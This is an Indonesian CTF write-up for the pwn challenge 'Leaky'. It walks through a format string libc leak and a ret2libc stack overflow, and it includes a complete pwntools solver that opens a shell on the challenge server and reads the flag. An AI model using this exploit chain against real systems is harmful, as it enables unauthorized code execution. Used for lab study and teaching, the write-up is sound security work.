# Writeup CTF - Leaky

## Informasi Challenge

- **Judul:** Leaky
- **Kategori:** Pwn
- **Service**

```text
nc chall.kali-team.online 10093
```

---

# File Challenge

Challenge menyediakan beberapa file berikut:

```text
flag.txt
ld-linux-x86-64.so.2
leaky
libc.so.6
```

---

# Analisis Proteksi Binary

Lakukan pengecekan menggunakan `checksec`:

```bash
checksec --file=leaky
```

Hasil:

```text
Arch:       amd64
RELRO:      Full RELRO
Canary:     No canary found
NX:         NX enabled
PIE:        No PIE
SHSTK:      Enabled
IBT:        Enabled
```

Dari hasil tersebut dapat disimpulkan:

- **No Canary** → Stack buffer overflow dapat dilakukan tanpa perlu membocorkan canary.
- **NX Enabled** → Shellcode pada stack tidak dapat dijalankan.
- **No PIE** → Alamat fungsi dan GOT pada binary bersifat tetap.
- **Full RELRO** → GOT bersifat read-only sehingga teknik overwrite GOT tidak dapat digunakan.
- Disediakan `libc.so.6`, sehingga eksploitasi **ret2libc** menjadi pilihan yang paling memungkinkan.

---

# Reverse Engineering

Binary dianalisis menggunakan **radare2**.

```bash
r2 -A leaky
```

Pada fungsi `challenge()` ditemukan potongan kode berikut:

```asm
puts("Welcome! Enter input:")

lea rax, [rbp-0x10]

mov edi, 0
call read

lea rax, [rbp-0x10]
mov rdi, rax

call printf
```

Apabila diterjemahkan ke bentuk C sederhana:

```c
char buffer[16];

read(0, buffer, 0x60);
printf(buffer);
```

Terlihat adanya dua kerentanan sekaligus:

1. **Format String Vulnerability**

```c
printf(buffer);
```

Input pengguna langsung dijadikan format string.

2. **Stack Buffer Overflow**

```c
read(0, buffer, 0x60);
```

Buffer hanya berukuran 16 byte, namun program membaca hingga 96 byte.

---

# Menentukan Offset Overflow

Layout stack:

```text
buffer      : 16 byte
saved RBP   : 8 byte
saved RIP
```

Sehingga offset menuju return address adalah:

```text
16 + 8 = 24 byte
```

```text
OFFSET = 24
```

---

# Tahap 1 - Leak Alamat libc

Karena terdapat format string vulnerability, alamat pada Global Offset Table (GOT) dapat dibaca.

Target yang digunakan adalah:

```text
printf@got
```

Payload format string:

```text
LEAK%11$sEND
```

Payload kemudian dipadukan dengan overflow sehingga setelah `printf()` selesai, eksekusi kembali ke fungsi `challenge()` untuk tahap berikutnya.

```python
payload = b"LEAK%11$sEND"
payload += b"\x00"

payload = payload.ljust(24, b"A")

payload += p64(ret)
payload += p64(elf.symbols["challenge"])
payload += p64(elf.got["printf"])
```

Output akan membocorkan alamat asli `printf()` dari libc.

Contoh:

```text
printf = 0x7fxxxxxxxxxxxx
```

---

# Menghitung Base libc

Setelah alamat `printf` diperoleh, base address libc dapat dihitung.

```python
libc.address = (
    printf_addr -
    libc.symbols["printf"]
)
```

Dengan base address tersebut, seluruh simbol libc dapat diketahui, termasuk:

- `system`
- `exit`
- string `"/bin/sh"`

---

# Tahap 2 - ret2libc

Gunakan gadget:

```text
pop rdi ; ret
```

untuk mengisi argumen pertama bagi fungsi `system()`.

Cari alamat string:

```text
"/bin/sh"
```

di dalam libc.

Payload akhir:

```python
payload = b"A" * 24

payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
```

Alur eksekusi menjadi:

```text
Buffer Overflow
      │
      ▼
 pop rdi ; ret
      │
      ▼
 "/bin/sh"
      │
      ▼
system("/bin/sh")
```

Setelah shell diperoleh, cukup menjalankan:

```bash
cat flag.txt
```

---

# Solver

```python
#!/usr/bin/env python3

from pwn import *

HOST = "chall.kali-team.online"
PORT = 10093

elf = ELF("./leaky", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = elf
context.log_level = "info"

OFFSET = 24

io = remote(HOST, PORT)

# ==========================
# Stage 1 - Leak libc
# ==========================

io.recvuntil(b"Welcome! Enter input:")

rop = ROP(elf)
ret = rop.find_gadget(["ret"]).address

payload = b"LEAK%11$sEND"
payload += b"\x00"

payload = payload.ljust(OFFSET, b"A")

payload += p64(ret)
payload += p64(elf.symbols["challenge"])
payload += p64(elf.got["printf"])

io.sendline(payload)

io.recvuntil(b"LEAK")

leak = io.recvuntil(
    b"END",
    drop=True
)

printf_addr = u64(
    leak[:8].ljust(8, b"\x00")
)

libc.address = (
    printf_addr -
    libc.symbols["printf"]
)

log.success(
    f"libc base = {hex(libc.address)}"
)

# ==========================
# Stage 2 - ret2libc
# ==========================

io.recvuntil(
    b"Welcome! Enter input:"
)

rop = ROP(libc)

pop_rdi = rop.find_gadget(
    ["pop rdi", "ret"]
).address

binsh = next(
    libc.search(b"/bin/sh\x00")
)

system = libc.symbols["system"]

payload = b"A" * OFFSET

payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

io.sendline(payload)

io.sendline(b"cat flag.txt")

io.interactive()
```

---

# Menjalankan Exploit

```bash
python3 solve.py
```

Output:

```text
$ cat flag.txt
KaliTeam{868d559b-f5ae-4d77-b8a0-923389f7f68b}
```

---

# Flag

```text
KaliTeam{868d559b-f5ae-4d77-b8a0-923389f7f68b}
```

---

